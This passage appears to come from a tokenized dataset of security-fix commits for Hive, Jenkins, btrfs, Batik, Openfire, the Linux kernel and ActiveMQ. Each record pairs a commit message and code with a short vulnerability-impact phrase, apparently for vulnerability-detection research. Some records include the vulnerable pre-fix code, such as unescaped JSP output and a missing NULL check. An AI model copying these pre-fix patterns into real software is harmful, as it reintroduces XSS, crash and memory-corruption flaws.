"auth_import_ptn", "@", "j", "=", "42", "#", "##", "#", "A", "masked", "pattern", "was", "here", "#", "##", "#", "PREHOOK", ":", "query", ":", "alter", "table", "auth_import_ptn", "drop", "partition", "(", "j", "=", "42", ")", "PREHOOK", ":", "type", ":", "ALTERTABLE_DROPPARTS", "PREHOOK", ":", "Input", ":", "default", "@", "auth_import_ptn", "PREHOOK", ":", "Output", ":", "default", "@", "auth_import_ptn", "@", "j", "=", "42", "POSTHOOK", ":", "query", ":", "alter", "table", "auth_import_ptn", "drop", "partition", "(", "j", "=", "42", ")", "POSTHOOK", ":", "type", ":", "ALTERTABLE_DROPPARTS", "POSTHOOK", ":", "Input", ":", "default", "@", "auth_import_ptn", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_import_ptn", "@", "j", "=", "42", "#", "##", "#", "A", "masked", "pattern", "was", "here", "#", "##", "#", "@", "@", "-", "0", ",", "0", "+", "1", ",", "18", "@", "@", "PREHOOK", ":", "query", ":", "-", "-", "check", "truncate", "on", "partition", "create", "table", "auth_trunc2", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "PREHOOK", ":", "type", ":", "CREATETABLE", "PREHOOK", ":", "Output", ":", "database", ":", "default", "PREHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "POSTHOOK", ":", "query", ":", "-", "-", "check", "truncate", "on", "partition", "create", "table", "auth_trunc2", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "POSTHOOK", ":", "type", ":", "CREATETABLE", "POSTHOOK", ":", "Output", ":", "database", ":", "default", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "PREHOOK", ":", "query", ":", "alter", "table", "auth_trunc2", "add", "partition", "(", "j", "=", "42", ")", "PREHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "PREHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "POSTHOOK", ":", "query", ":", "alter", "table", "auth_trunc2", "add", "partition", "(", "j", "=", "42", ")", "POSTHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "@", "j", "=", "42", "FAILED", ":", "HiveAccessControlException", "Permission", "denied", ":", "Principal", "[", "name", "=", "user1", ",", "type", "=", "USER", "]", "does", "not", "have", "following", "privileges", "for", "operation", "TRUNCATETABLE", "[", "[", "OBJECT", "OWNERSHIP", "]", "on", "Object", "[", "type", "=", "TABLE_OR_VIEW", ",", "name", "=", "default", ".", "auth_trunc2", "]", "]</s>"], "docstring_tokens": ["bypass", "intended", "parent", "table", "access", "restrictions"]}
{"contents": ["[SECURITY-161]", "Add", "Admin", "warning", "for", "hosts", "missing", "SSH", "key", "verification"], "code_tokens": ["/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2016", ",", "Michael", "Clarke", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "plugins", ".", "sshslaves", ".", "verifiers", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "model", ".", "AdministrativeMonitor", ";", "import", "hudson", ".", "model", ".", "Computer", ";", "import", "hudson", ".", "plugins", ".", "sshslaves", ".", "SSHLauncher", ";", "import", "hudson", ".", "slaves", ".", "ComputerLauncher", ";", "import", "hudson", ".", "slaves", ".", "SlaveComputer", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "/", "**", "*", "An", "administrative", "warning", "that", "checks", "all", "SSH", "slaves", "have", "a", "{", "@", "link", "HostKeyVerifier", "}", "*", "set", "against", "them", "and", "prompts", "the", "admin", "to", "update", "the", "settings", "as", "needed", ".", "*", "@", "author", "Michael", "Clarke", "*", "@", "since", "1", ".", "12", "*", "/", "@", "Extension", "public", "class", "MissingVerifierAdministrativeMonitor", "extends", "AdministrativeMonitor", "{", "@", "Override", "public", "boolean", "isActivated", "(", ")", "{", "for", "(", "Computer", "computer", ":", "Jenkins", ".", "getInstance", "(", ").", "getComputers", "(", "))", "{", "if", "(", "computer", "instanceof", "SlaveComputer", ")", "{", "ComputerLauncher", "launcher", "=", "(", "(", "SlaveComputer", ")", "computer", ")", ".", "getLauncher", "(", ");", "if", "(", "launcher", "instanceof", "SSHLauncher", "&", "&", "null", "=", "=", "(", "(", "SSHLauncher", ")", "launcher", ")", ".", "getHostKeyVerifier", "(", "))", "{", "return", "true", ";", "}", "}", "}", "return", "false", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "29", "@", "@", "<", "!-", "-", "The", "MIT", "License", "Copyright", "(", "c", ")", "2016", ",", "Michael", "Clarke", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", "-", "->", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "c", "=", "\"/", "lib", "/", "credentials", "\"", ">", "<", "div", "class", "=", "\"", "warning", "\"", ">", "<", "p", ">", "SSH", "Host", "Key", "Verifiers", "are", "not", "configured", "for", "all", "SSH", "slaves", "on", "this", "Jenkins", "instance", ".", "This", "could", "leave", "these", "slaves", "open", "to", "man", "-", "in", "-", "the", "-", "middle", "attacks", ".", "<", "a", "href", "=", "\"$", "{", "rootURL", "}", "/", "computer", "/", "\">", "Update", "your", "slave", "configuration", "<", "/", "a", ">", "to", "resolve", "this", ".", "</", "p", ">", "<", "/", "div", ">", "<", "/", "j", ":", "jelly", "></s>"], "docstring_tokens": ["gain", "access", "to", "the", "communication", "channel", "between", "endpoints", "and", "obtain", "sensitive", "information"]}
{"contents": ["btrfs:", "tree-checker:", "Verify", "block_group_item", "A", "crafted", "image", "with", "invalid", "block", "group", "items", "could", "make", "free", "space", "cache", "code", "to", "cause", "panic.", "We", "could", "detect", "such", "invalid", "block", "group", "item", "by", "checking:", "1)", "Item", "size", "Known", "fixed", "value.", "2)", "Block", "group", "size", "(key.offset)", "We", "have", "an", "upper", "limit", "on", "block", "group", "item", "(10G)", "3)", "Chunk", "objectid", "Known", "fixed", "value.", "4)", "Type", "Only", "4", "valid", "type", "values,", "DATA,", "METADATA,", "SYSTEM", "and", "DATA|METADATA.", "No", "more", "than", "1", "bit", "set", "for", "profile", "type.", "5)", "Used", "space", "No", "more", "than", "the", "block", "group", "size.", "This", "should", "allow", "btrfs", "to", "detect", "and", "refuse", "to", "mount", "the", "crafted", "image.", "Link:", "https://bugzilla.kernel.org/show_bug.cgi?id=199849", "Reported-by:", "Xu", "Wen", "<wen.xu@gatech.edu>", "Signed-off-by:", "Qu", "Wenruo", "<wqu@suse.com>", "Reviewed-by:", "Gu", "Jinxiang", "<gujx@cn.fujitsu.com>", "Reviewed-by:", "Nikolay", "Borisov", "<nborisov@suse.com>", "Tested-by:", "Gu", "Jinxiang", "<gujx@cn.fujitsu.com>", "Reviewed-by:", "David", "Sterba", "<dsterba@suse.com>", "Signed-off-by:", "David", "Sterba", "<dsterba@suse.com>"], "code_tokens": ["#", "include", "\"", "volumes", ".", "h", "\"", "__printf", "(", "4", ",", "5", ")", "__cold", "static", "void", "block_group_err", "(", "const", "struct", "btrfs_fs_info", "*", "fs_info", ",", "const", "struct", "extent_buffer", "*", "eb", ",", "int", "slot", ",", "const", "char", "*", "fmt", ",", ".", "..", ")", "{", "struct", "btrfs_key", "key", ";", "struct", "va_format", "vaf", ";", "va_list", "args", ";", "btrfs_item_key_to_cpu", "(", "eb", ",", "&", "key", ",", "slot", ")", ";", "va_start", "(", "args", ",", "fmt", ")", ";", "vaf", ".", "fmt", "=", "fmt", ";", "vaf", ".", "va", "=", "&", "args", ";", "btrfs_crit", "(", "fs_info", ",", "\"", "corrupt", "%", "s", ":", "root", "=", "%", "llu", "block", "=", "%", "llu", "slot", "=", "%", "d", "bg_start", "=", "%", "llu", "bg_len", "=", "%", "llu", ",", "%", "pV", "\"", ",", "btrfs_header_level", "(", "eb", ")", "=", "=", "0", "?", "\"", "leaf", "\"", ":", "\"", "node", "\"", ",", "btrfs_header_owner", "(", "eb", ")", ",", "btrfs_header_bytenr", "(", "eb", ")", ",", "slot", ",", "key", ".", "objectid", ",", "key", ".", "offset", ",", "&", "vaf", ")", ";", "va_end", "(", "args", ")", ";", "}", "static", "int", "check_block_group_item", "(", "struct", "btrfs_fs_info", "*", "fs_info", ",", "struct", "extent_buffer", "*", "leaf", ",", "struct", "btrfs_key", "*", "key", ",", "int", "slot", ")", "{", "struct", "btrfs_block_group_item", "bgi", ";", "u32", "item_size", "=", "btrfs_item_size_nr", "(", "leaf", ",", "slot", ")", ";", "u64", "flags", ";", "u64", "type", ";", "/", "*", "*", "Here", "we", "don", "'", "t", "really", "care", "about", "alignment", "since", "extent", "allocator", "can", "*", "handle", "it", ".", "We", "care", "more", "about", "the", "size", ",", "as", "if", "one", "block", "group", "is", "*", "larger", "than", "maximum", "size", ",", "it", "'", "s", "must", "be", "some", "obvious", "corruption", ".", "*", "/", "if", "(", "key", "-", ">", "offset", ">", "BTRFS_MAX_DATA_CHUNK_SIZE", "|", "|", "key", "-", ">", "offset", "=", "=", "0", ")", "{", "block_group_err", "(", "fs_info", ",", "leaf", ",", "slot", ",", "\"", "invalid", "block", "group", "size", ",", "have", "%", "llu", "expect", "(", "0", ",", "%", "llu", "]", "\",", "key", "-", ">", "offset", ",", "BTRFS_MAX_DATA_CHUNK_SIZE", ")", ";", "return", "-", "EUCLEAN", ";", "}", "if", "(", "item_size", "!", "=", "sizeof", "(", "bgi", ")", ")", "{", "block_group_err", "(", "fs_info", ",", "leaf", ",", "slot", ",", "\"", "invalid", "item", "size", ",", "have", "%", "u", "expect", "%", "zu", "\"", ",", "item_size", ",", "sizeof", "(", "bgi", ")", ");", "return", "-", "EUCLEAN", ";", "}", "read_extent_buffer", "(", "leaf", ",", "&", "bgi", ",", "btrfs_item_ptr_offset", "(", "leaf", ",", "slot", ")", ",", "sizeof", "(", "bgi", ")", ");", "if", "(", "btrfs_block_group_chunk_objectid", "(", "&", "bgi", ")", "!", "=", "BTRFS_FIRST_CHUNK_TREE_OBJECTID", ")", "{", "block_group_err", "(", "fs_info", ",", "leaf", ",", "slot", ",", "\"", "invalid", "block", "group", "chunk", "objectid", ",", "have", "%", "llu", "expect", "%", "llu", "\"", ",", "btrfs_block_group_chunk_objectid", "(", "&", "bgi", ")", ",", "BTRFS_FIRST_CHUNK_TREE_OBJECTID", ")", ";", "return", "-", "EUCLEAN", ";", "}", "if", "(", "btrfs_block_group_used", "(", "&", "bgi", ")", ">", "key", "-", ">", "offset", ")", "{", "block_group_err", "(", "fs_info", ",", "leaf", ",", "slot", ",", "\"", "invalid", "block", "group", "used", ",", "have", "%", "llu", "expect", "[", "0", ",", "%", "llu", ")", "\",", "btrfs_block_group_used", "(", "&", "bgi", ")", ",", "key", "-", ">", "offset", ")", ";", "return", "-", "EUCLEAN", ";", "}", "flags", "=", "btrfs_block_group_flags", "(", "&", "bgi", ")", ";", "if", "(", "hweight64", "(", "flags", "&", "BTRFS_BLOCK_GROUP_PROFILE_MASK", ")", ">", "1", ")", "{", "block_group_err", "(", "fs_info", ",", "leaf", ",", "slot", ",", "\"", "invalid", "profile", "flags", ",", "have", "0x", "%", "llx", "(", "%", "lu", "bits", "set", ")", "expect", "no", "more", "than", "1", "bit", "set", "\"", ",", "flags", "&", "BTRFS_BLOCK_GROUP_PROFILE_MASK", ",", "hweight64", "(", "flags", "&", "BTRFS_BLOCK_GROUP_PROFILE_MASK", ")", ");", "return", "-", "EUCLEAN", ";", "}", "type", "=", "flags", "&", "BTRFS_BLOCK_GROUP_TYPE_MASK", ";", "if", "(", "type", "!", "=", "BTRFS_BLOCK_GROUP_DATA", "&", "&", "type", "!", "=", "BTRFS_BLOCK_GROUP_METADATA", "&", "&", "type", "!", "=", "BTRFS_BLOCK_GROUP_SYSTEM", "&", "&", "type", "!", "=", "(", "BTRFS_BLOCK_GROUP_METADATA", "|", "BTRFS_BLOCK_GROUP_DATA", ")", ")", "{", "block_group_err", "(", "fs_info", ",", "leaf", ",", "slot", ",", "\"", "invalid", "type", ",", "have", "0x", "%", "llx", "(", "%", "lu", "bits", "set", ")", "expect", "either", "0x", "%", "llx", ",", "0x", "%", "llx", ",", "0x", "%", "llu", "or", "0x", "%", "llx", "\"", ",", "type", ",", "hweight64", "(", "type", ")", ",", "BTRFS_BLOCK_GROUP_DATA", ",", "BTRFS_BLOCK_GROUP_METADATA", ",", "BTRFS_BLOCK_GROUP_SYSTEM", ",", "BTRFS_BLOCK_GROUP_METADATA", "|", "BTRFS_BLOCK_GROUP_DATA", ")", ";", "return", "-", "EUCLEAN", ";", "}", "return", "0", ";", "}", "case", "BTRFS_BLOCK_GROUP_ITEM_KEY", ":", "ret", "=", "check_block_group_item", "(", "fs_info", ",", "leaf", ",", "key", ",", "slot", ")", ";", "break", ";", "max_chunk_size", "=", "BTRFS_MAX_DATA_CHUNK_SIZE", ";", "#", "define", "BTRFS_MAX_DATA_CHUNK_SIZE", "(", "10ULL", "*", "SZ_1G", ")</s>max_chunk_size", "=", "10", "*", "max_stripe_size", ";"], "docstring_tokens": ["a", "denial", "of", "service", "condition"]}
{"contents": ["BATIK-1139:", "DTD", "resolution", "validation", "git-svn-id:", "https://svn.apache.org/repos/asf/xmlgraphics/batik/trunk@1742892", "13f79535-47bb-0310-9956-ffa450edef68"], "code_tokens": ["parser", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ",", "false", ")", ";", "parser", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "\"", ",", "false", ")", ";</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "or", "possibly", "cause", "a", "denial", "of", "service"]}
{"contents": ["Fix", "issues", "identified", "by", "CSW", "(#1561)"], "code_tokens": ["request", ".", "setAttribute", "(", "\"", "warningMessage", "\"", ",", "LocaleUtils", ".", "getLocalizedString", "(", "\"", "system", ".", "cache", "-", "details", ".", "cache_not_found", "\"", ",", "Collections", ".", "singletonList", "(", "StringUtils", ".", "escapeHTMLTags", "(", "cacheName", ")", "))", ");", "<", "input", "type", "=", "\"", "text", "\"", "size", "=", "\"", "30", "\"", "maxlength", "=", "\"", "100", "\"", "name", "=", "\"", "alias", "\"", "id", "=", "\"", "alias", "\"", "value", "=", "\"<", "c", ":", "out", "value", "=", "'$", "{", "param", ".", "alias", "}", "'/", ">\"", "\">", "<", "input", "type", "=", "\"", "hidden", "\"", "name", "=", "\"", "isTrustStore", "\"", "value", "=", "\"<", "c", ":", "out", "value", "=", "'$", "{", "param", ".", "isTrustStore", "}", "'/", ">\"", "/>", "<", "fmt", ":", "message", "key", "=", "\"", "system", ".", "cache", "-", "details", ".", "title", "\"", "var", "=", "\"", "title", "\"", "><", "fmt", ":", "param", "value", "=", "\"$", "{", "cacheName", "}", "\"/", "><", "/", "fmt", ":", "message", ">", "<", "title", ">", "<", "c", ":", "out", "value", "=", "\"$", "{", "title", "}", "\"/", "><", "/", "title", ">", "value", "=", "\"<", "c", ":", "out", "value", "=", "'$", "{", "param", ".", "search", "}", "'/", ">\"", "><", "/", "td", "></s>request", ".", "setAttribute", "(", "\"", "warningMessage", "\"", ",", "LocaleUtils", ".", "getLocalizedString", "(", "\"", "system", ".", "cache", "-", "details", ".", "cache_not_found", "\"", ",", "Collections", ".", "singletonList", "(", "cacheName", ")", "))", ";", "<", "input", "type", "=", "\"", "text", "\"", "size", "=", "\"", "30", "\"", "maxlength", "=", "\"", "100", "\"", "name", "=", "\"", "alias", "\"", "id", "=", "\"", "alias", "\"", "value", "=", "\"$", "{", "param", ".", "alias", "}", "\">", "<", "input", "type", "=", "\"", "hidden", "\"", "name", "=", "\"", "isTrustStore", "\"", "value", "=", "\"$", "{", "param", ".", "isTrustStore", "}", "\"/", ">", "<", "title", ">", "<", "fmt", ":", "message", "key", "=", "\"", "system", ".", "cache", "-", "details", ".", "title", "\"", "><", "fmt", ":", "param", "value", "=", "\"$", "{", "cacheName", "}", "\"/", "><", "/", "fmt", ":", "message", ">", "</", "title", ">", "value", "=", "\"<", "%=", "((", "search", "!", "=", "null", ")", "?", "search", ":", "\"", "\")", "%>", "\">", "</", "td", ">"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["KEYS:", "Fix", "bug", "in", "keyctl_session_to_parent()", "if", "parent", "has", "no", "session", "keyring", "Fix", "a", "bug", "in", "keyctl_session_to_parent()", "whereby", "it", "tries", "to", "check", "the", "ownership", "of", "the", "parent", "process's", "session", "keyring", "whether", "or", "not", "the", "parent", "has", "a", "session", "keyring", ".", "This", "results", "in", "the", "following", "oops:", "BUG:", "unable", "to", "handle", "kernel", "NULL", "pointer", "dereference", "at", "00000000000000a0", "IP:", "[<ffffffff811ae4dd>]", "keyctl_session_to_parent+0x251/0x443", "...", "Call", "Trace:", "[<ffffffff811ae2f3>]", "?", "keyctl_session_to_parent+0x67/0x443", "[<ffffffff8109d286>]", "?", "__do_fault+0x24b/0x3d0", "[<ffffffff811af98c>]", "sys_keyctl+0xb4/0xb8", "[<ffffffff81001eab>]", "system_call_fastpath+0x16/0x1b", "if", "the", "parent", "process", "has", "no", "session", "keyring.", "If", "the", "system", "is", "using", "pam_keyinit", "then", "it", "mostly", "protected", "against", "this", "as", "all", "processes", "derived", "from", "a", "login", "will", "have", "inherited", "the", "session", "keyring", "created", "by", "pam_keyinit", "during", "the", "log", "in", "procedure.", "To", "test", "this,", "pam_keyinit", "calls", "need", "to", "be", "commented", "out", "in", "/etc/pam.d/.", "Reported-by:", "Tavis", "Ormandy", "<taviso@cmpxchg8b.com>", "Signed-off-by:", "David", "Howells", "<dhowells@redhat.com>", "Acked-by:", "Tavis", "Ormandy", "<taviso@cmpxchg8b.com>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "(", "pcred", "-", ">", "tgcred", "-", ">", "session_keyring", "&", "&", "pcred", "-", ">", "tgcred", "-", ">", "session_keyring", "-", ">", "uid", "!", "=", "mycred", "-", ">", "euid", ")", "|", "|</s>if", "(", "pcred", "-", ">", "tgcred", "-", ">", "session_keyring", "-", ">", "uid", "!", "=", "mycred", "-", ">", "euid", "|", "|"], "docstring_tokens": ["the", "a", "kernel", "oops"]}
{"contents": ["execve:", "must", "clear", "current->clear_child_tid", "While", "looking", "at", "Jens", "Rosenboom", "bug", "report", "(http://lkml.org/lkml/2009/7/27/35)", "about", "strange", "sys_futex", "call", "done", "from", "a", "dying", "\"ps\"", "program,", "we", "found", "following", "problem.", "clone()", "syscall", "has", "special", "support", "for", "TID", "of", "created", "threads.", "This", "support", "includes", "two", "features.", "One", "(CLONE_CHILD_SETTID)", "is", "to", "set", "an", "integer", "into", "user", "memory", "with", "the", "TID", "value.", "One", "(CLONE_CHILD_CLEARTID)", "is", "to", "clear", "this", "same", "integer", "once", "the", "created", "thread", "dies.", "The", "integer", "location", "is", "a", "user", "provided", "pointer,", "provided", "at", "clone()", "time.", "kernel", "keeps", "this", "pointer", "value", "into", "current->clear_child_tid.", "At", "execve()", "time,", "we", "should", "make", "sure", "kernel", "doesnt", "keep", "this", "user", "provided", "pointer,", "as", "full", "user", "memory", "is", "replaced", "by", "a", "new", "one.", "As", "glibc", "fork()", "actually", "uses", "clone()", "syscall", "with", "CLONE_CHILD_SETTID", "and", "CLONE_CHILD_CLEARTID", "set,", "chances", "are", "high", "that", "we", "might", "corrupt", "user", "memory", "in", "forked", "processes.", "Following", "sequence", "could", "happen:", "1)", "bash", "(or", "any", "program)", "starts", "a", "new", "process,", "by", "a", "fork()", "call", "that", "glibc", "maps", "to", "a", "clone(", "...", "CLONE_CHILD_SETTID", "|", "CLONE_CHILD_CLEARTID", "...)", "syscall", "2)", "When", "new", "process", "starts,", "its", "current->clear_child_tid", "is", "set", "to", "a", "location", "that", "has", "a", "meaning", "only", "in", "bash", "(or", "initial", "program)", "context", "(&THREAD_SELF->tid)", "3)", "This", "new", "process", "does", "the", "execve()", "syscall", "to", "start", "a", "new", "program.", "current->clear_child_tid", "is", "left", "unchanged", "(a", "non", "NULL", "value)", "4)", "If", "this", "new", "program", "creates", "some", "threads,", "and", "initial", "thread", "exits,", "kernel", "will", "attempt", "to", "clear", "the", "integer", "pointed", "by", "current->clear_child_tid", "from", "mm_release()", ":", "if", "(tsk->clear_child_tid", "&&", "!(tsk->flags", "&", "PF_SIGNALED)", "&&", "atomic_read(&mm->mm_users)", ">", "1)", "{", "u32", "__user", "*", "tidptr", "=", "tsk->clear_child_tid;", "tsk->clear_child_tid", "=", "NULL;", "/*", "*", "We", "don't", "check", "the", "error", "code", "-", "if", "userspace", "has", "*", "not", "set", "up", "a", "proper", "pointer", "then", "tough", "luck.", "*/", "<<", "here", ">>", "put_user(0,", "tidptr);", "sys_futex(tidptr,", "FUTEX_WAKE,", "1,", "NULL,", "NULL,", "0);", "}", "5)", "OR", ":", "if", "new", "program", "is", "not", "multi-threaded,", "but", "spied", "by", "/proc/pid", "users", "(ps", "command", "for", "example),", "mm_users", ">", "1,", "and", "the", "exiting", "program", "could", "corrupt", "4", "bytes", "in", "a", "persistent", "memory", "area", "(shm", "or", "memory", "mapped", "file)", "If", "current->clear_child_tid", "points", "to", "a", "writeable", "portion", "of", "memory", "of", "the", "new", "program,", "kernel", "happily", "and", "silently", "corrupts", "4", "bytes", "of", "memory,", "with", "unexpected", "effects.", "Fix", "is", "straightforward", "and", "should", "not", "break", "any", "sane", "program.", "Reported-by:", "Jens", "Rosenboom", "<jens@mcbone.net>", "Acked-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>", "Signed-off-by:", "Eric", "Dumazet", "<eric.dumazet@gmail.com>", "Signed-off-by:", "Oleg", "Nesterov", "<oleg@redhat.com>", "Cc:", "Peter", "Zijlstra", "<peterz@infradead.org>", "Cc:", "Sonny", "Rao", "<sonnyrao@us.ibm.com>", "Cc:", "Ingo", "Molnar", "<mingo@elte.hu>", "Cc:", "Thomas", "Gleixner", "<tglx@linutronix.de>", "Cc:", "Ulrich", "Drepper", "<drepper@redhat.com>", "Cc:", "Oleg", "Nesterov", "<oleg@redhat.com>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "tsk", "-", ">", "clear_child_tid", ")", "{", "if", "(", "!(", "tsk", "-", ">", "flags", "&", "PF_SIGNALED", ")", "&", "&", "atomic_read", "(", "&", "mm", "-", ">", "mm_users", ")", ">", "1", ")", "{", "/", "*", "*", "We", "don", "'", "t", "check", "the", "error", "code", "-", "if", "userspace", "has", "*", "not", "set", "up", "a", "proper", "pointer", "then", "tough", "luck", ".", "*", "/", "put_user", "(", "0", ",", "tsk", "-", ">", "clear_child_tid", ")", ";", "sys_futex", "(", "tsk", "-", ">", "clear_child_tid", ",", "FUTEX_WAKE", ",", "1", ",", "NULL", ",", "NULL", ",", "0", ")", ";", "}</s>if", "(", "tsk", "-", ">", "clear_child_tid", "&", "&", "!", "(", "tsk", "-", ">", "flags", "&", "PF_SIGNALED", ")", "&", "&", "atomic_read", "(", "&", "mm", "-", ">", "mm_users", ")", ">", "1", ")", "{", "u32", "__user", "*", "tidptr", "=", "tsk", "-", ">", "clear_child_tid", ";", "/", "*", "*", "We", "don", "'", "t", "check", "the", "error", "code", "-", "if", "userspace", "has", "*", "not", "set", "up", "a", "proper", "pointer", "then", "tough", "luck", ".", "*", "/", "put_user", "(", "0", ",", "tidptr", ")", ";", "sys_futex", "(", "tidptr", ",", "FUTEX_WAKE", ",", "1", ",", "NULL", ",", "NULL", ",", "0", ")", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(memory", "corruption", ")", "or", "possibly", "gain", "privileges"]}
{"contents": ["https://issues.apache.org/jira/browse/AMQ-6013", "-", "restrict", "classes", "which", "can", "be", "serialized", "inside", "the", "broker"], "code_tokens": ["import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Map", ";", "private", "static", "String", "[", "]", "serializablePackages", ";", "Class", "clazz", "=", "load", "(", "classDesc", ".", "getName", "(", "),", "cl", ",", "inLoader", ")", ";", "checkSecurity", "(", "clazz", ")", ";", "return", "clazz", ";", "Class", "clazz", "=", "null", ";", "clazz", "=", "Proxy", ".", "getProxyClass", "(", "cl", ",", "cinterfaces", ")", ";", "clazz", "=", "Proxy", ".", "getProxyClass", "(", "inLoader", ",", "cinterfaces", ")", ";", "clazz", "=", "Proxy", ".", "getProxyClass", "(", "FALLBACK_CLASS_LOADER", ",", "cinterfaces", ")", ";", "}", "if", "(", "clazz", "!", "=", "null", ")", "{", "checkSecurity", "(", "clazz", ")", ";", "return", "clazz", ";", "}", "else", "{", "throw", "new", "ClassNotFoundException", "(", "null", ")", ";", "}", "}", "public", "static", "String", "[", "]", "getSerialziablePackages", "(", ")", "{", "if", "(", "serializablePackages", "=", "=", "null", ")", "{", "serializablePackages", "=", "System", ".", "getProperty", "(", "\"", "org", ".", "apache", ".", "activemq", ".", "SERIALIZABLE_PACKAGES", "\"", ",", "\"", "java", ".", "lang", ",", "java", ".", "util", ",", "org", ".", "apache", ".", "activemq", ",", "org", ".", "fusesource", ".", "hawtbuf", ",", "com", ".", "thoughtworks", ".", "xstream", ".", "mapper", "\"", ").", "split", "(", "\",", "\")", ";", "}", "return", "serializablePackages", ";", "}", ";", "public", "static", "boolean", "isAllAllowed", "(", ")", "{", "return", "getSerialziablePackages", "(", ").", "length", "=", "=", "1", "&", "&", "getSerialziablePackages", "(", ")[", "0", "]", ".", "equals", "(", "\"*", "\")", ";", "}", 